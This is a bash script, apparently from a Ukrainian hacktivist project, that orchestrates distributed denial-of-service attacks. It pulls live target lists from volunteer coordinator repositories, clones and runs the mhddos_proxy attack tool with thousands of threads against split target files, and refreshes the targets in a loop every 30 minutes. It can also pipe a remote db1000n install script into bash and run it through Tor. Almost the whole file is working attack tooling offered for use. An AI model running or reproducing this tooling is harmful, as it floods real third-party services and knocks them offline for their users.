#!/bin/bash
# curl -LO tiny.one/multiddos && bash multiddos
# curl -O https://raw.githubusercontent.com/KarboDuck/multiddos/main/md2.sh && bash md2.sh
clear && echo -e "Loading... v0.9.9d\n"
sudo apt-get update -q -y #>/dev/null 2>&1
sudo apt-get install -q -y tmux jq toilet python3 python3-pip 
pip install --upgrade pip >/dev/null 2>&1
pkill -f start.py; pkill -f runner.py; #stop old processes if they still running
rm -rf ~/multidd*; mkdir -p ~/multidd/targets/ ; cd ~/multidd # clean working folder 

# create swap file if system doesn't have it. Helps systems with very little RAM.
if [[ $(echo $(swapon --noheadings --bytes | cut -d " " -f3)) == "" ]]; then
    sudo fallocate -l 1G /swp && sudo chmod 600 /swp && sudo mkswap /swp && sudo swapon /swp
fi

typing_on_screen (){
    tput setaf 2 &>/dev/null # green
    for ((i=0; i<=${#1}; i++)); do
        printf '%s' "${1:$i:1}"
        sleep 0.05$(( (RANDOM % 5) + 1 ))
    done
    tput sgr0 2 &>/dev/null
}
export -f typing_on_screen

#if launched in docker than variables saved in docker md.sh will be used
if [[ $docker_mode != "true" ]]; then
    gotop="on"
    db1000n="off"
    vnstat="off"
    proxy_finder="off"
fi

if [[ $t_set_manual != "on" ]]; then export threads="-t 4000"; fi # default threads if not passed in cmd line
if [[ $t_proxy_manual != "on" ]]; then export proxy_threads="2000"; fi # default proxy_threads if not passed in cmd line

### prepare target files and show banner
prepare_targets_and_banner () {
rm -rf ~/multidd/targets/*

# 1 DDOS по країні СЕПАРІВ (Кібер-Козаки)          https://t.me/ddos_separ
echo "$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/all.txt)" > ~/multidd/targets/source1.txt
# 2 IT ARMY of Ukraine                             https://t.me/itarmyofukraine2022
echo "$(curl -s -X GET "https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json" 2>/dev/null | jq -r '.jobs[].args.request.path')" > ~/multidd/targets/source2.txt
echo "$(curl -s -X GET "https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json" 2>/dev/null | jq -r '.jobs[].args.client.static_host.addr')" > ~/multidd/targets/source3.txt

# skip wrong lines in sources (those happens) and combine all sources together in single file all_targets.txt
cat ~/multidd/targets/source* | while read LINE; do
    if [[ $LINE == "http"* ]] || [[ $LINE == "tcp://"* ]]; then
        echo $LINE >> ~/multidd/targets/all_targets.txt
    fi
done

# delete duplicates, randomize order and save final targets in uniq_targets.txt
cat ~/multidd/targets/all_targets.txt | sort | uniq | sort -R > ~/multidd/targets/uniq_targets.txt

# Print greetings and number of targets; yes, app name "toilet" is unfortunate
clear
toilet -t --metal "Український"
toilet -t --metal "   жнець"
toilet -t --metal " MULTIDDOS"
typing_on_screen 'Шукаю завдання...' ; sleep 0.5
echo -e "\n\nTotal targets found:" "\x1b[32m $(cat ~/multidd/targets/all_targets.txt | wc -l)\x1b[m" && sleep 0.1
echo -e "Uniq targets:" "\x1b[32m $(cat ~/multidd/targets/uniq_targets.txt | wc -l)\x1b[m" && sleep 0.1
echo -e "\nЗавантаження..."; sleep 3
clear
}
export -f prepare_targets_and_banner

launch () {
# kill previous sessions or processes in case they still in memory
tmux kill-session -t multidd > /dev/null 2>&1

# tmux mouse support
grep -qxF 'set -g mouse on' ~/.tmux.conf || echo 'set -g mouse on' >> ~/.tmux.conf
tmux source-file ~/.tmux.conf > /dev/null 2>&1

if [[ $gotop == "on" ]]; then
    if [ ! -f "/usr/local/bin/gotop" ]; then
        curl -L https://github.com/cjbassi/gotop/releases/download/3.0.0/gotop_3.0.0_linux_amd64.deb -o gotop.deb
        sudo dpkg -i gotop.deb
    fi
    tmux new-session -s multiddos -d 'gotop -sc solarized'
    tmux split-window -h -p 66 'bash auto_bash.sh'
else
    tmux new-session -s multiddos -d 'bash auto_bash.sh'
fi

if [[ $vnstat == "on" ]]; then
    sudo apt -yq install vnstat
    tmux split-window -v 'vnstat -l'
fi

if [[ $db1000n == "on" ]]; then
    sudo apt -yq install torsocks
    tmux split-window -v 'curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh | bash && torsocks -i ./db1000n'
fi

if [[ $proxy_finder == "on" ]]; then
    tmux split-window -v -p 20 'rm -rf ~/multidd/proxy_finder; git clone https://github.com/porthole-ascend-cinnamon/proxy_finder ~/multidd/proxy_finder; cd ~/multidd/proxy_finder; python3 -m pip install -r requirements.txt; clear; echo -e "\x1b[32mШукаю проксі, в середньому одна робоча знаходиться після 10млн перевірок\x1b[m"; python3 ~/multidd/proxy_finder/finder.py  --threads $proxy_threads'
fi
tmux attach-session -t multidd
}

while [ "$1" != "" ]; do
    case $1 in
        +d | --db1000n )   db1000n="on"; shift ;;
        -g | --gotop ) gotop="off"; db1000n="off"; shift ;;
        +v | --vnstat ) vnstat="on"; shift ;;
        --lite ) export lite="on"; shift ;;
        --plite ) export lite="on"; export proxy_threads=1000; shift ;;
        -p | --proxy-threads ) export proxy_finder="on"; export proxy_threads="$2"; shift 2 ;;
        *   ) export args_to_pass+=" $1"; shift ;; #pass all unrecognized arguments to mhddos_proxy
    esac
done

prepare_targets_and_banner

# create small separate script to re-launch only this small part of code
cd ~/multidd
cat > auto_bash.sh << 'EOF'
# Restart and update everything (mhddos_proxy and targets) every 30 minutes
while true; do
    #install mhddos_proxy
    rm -rf ~/multidd/mhddos_proxy;
    git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
    cd mhddos_proxy
    python3 -m pip install -r requirements.txt

    if [[ $lite == "on" ]]; then
        tail -n 1000 ~/multidd/targets/uniq_targets.txt > ~/multidd/targets/lite_targets.txt
        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/lite_targets.txt $methods $args_to_pass -t 2000 &
    else
        cd ~/multidd/targets/
        split -n 4 --additional-suffix=.uaripper ~/multidd/targets/uniq_targets.txt; cd ~/multidd/mhddos_proxy #split targets in N parts
        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xaa.uaripper $methods $threads $args_to_pass &
        sleep 5 # to decrease load on cpu during simultaneous start
        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xab.uaripper $methods $threads $args_to_pass &
        sleep 5 # to decrease load on cpu during simultaneous start
        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xac.uaripper $methods $threads $args_to_pass &
        sleep 5 # to decrease load on cpu during simultaneous start
        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xad.uaripper $methods $threads $args_to_pass &
    fi
sleep 30
pkill -f start.py; pkill -f runner.py;
prepare_targets_and_banner
done
EOF

launch